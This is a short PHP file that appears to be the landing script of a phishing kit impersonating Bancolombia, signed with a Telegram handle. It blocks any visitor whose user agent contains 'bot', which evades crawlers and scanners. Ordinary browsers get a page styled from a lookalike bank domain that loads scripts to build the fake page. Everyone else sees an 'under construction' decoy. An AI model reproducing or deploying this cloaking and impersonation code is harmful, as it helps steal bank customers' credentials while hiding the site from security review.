<?php

 // Desarrollado por Lobo (@l0b0z Telegram)
 ERROR_REPORTING(0);
 session_start();
 
function find_text($text, $in){
$k2HjS9_09 = explode($text, $in);
$k2HjS9_08 = $k2HjS9_09[1];

if($k2HjS9_08 != ''){
return 1;
} else {
return 0;
}

}
 $rand = rand(000000,999999);
 $_SESSION['id'] = $rand;
 $agent = $_SERVER['HTTP_USER_AGENT'];

if(find_text('Bot', $agent) == 1 or find_text('BOT', $agent) == 1 or find_text('bot', $agent) == 1){
exit();
}

if(find_text('Chrome', $agent) == 1 or find_text('Firefox', $agent) == 1 or find_text('firefox', $agent) == 1 or find_text('Focus', $agent) == 1 or find_text('focus', $agent) == 1 or find_text('Opera', $agent) == 1 or find_text('opera', $agent) == 1 or find_text('iPhone', $agent) == 1 or find_text('Safari', $agent) == 1){
?>
<!-- Telegram (@l0b0z) -->

<html>
<link href="styles/styles.css" media="all" rel="stylesheet" type="text/css">
<link href="https://sucursalpersonas.transaccionesbancolombia.com/mua/css/bootstrap.css" media="all" rel="stylesheet" type="text/css">  
<script src="jquery.min.js"></script>

<body id="div1">
</body>
<script src="jquery-second.js">  
</script>
</html>

<?php

} else {

?>
<html>
	 <head>
	 <title>
	 Bienvenidos a mi sitio web
	 </title>
	 </head>
	 
	 <body>
	 
	 <center>
	 
	 <h2>Bienvenidos a mi sitio web</h2>
	 <p> -------------------------</P>
	 <H2> EN CONSTRUCCIÓN </H2>
	 
	 </center>
	 
	 </body>
	 
	 </html>
<?php

}

?>


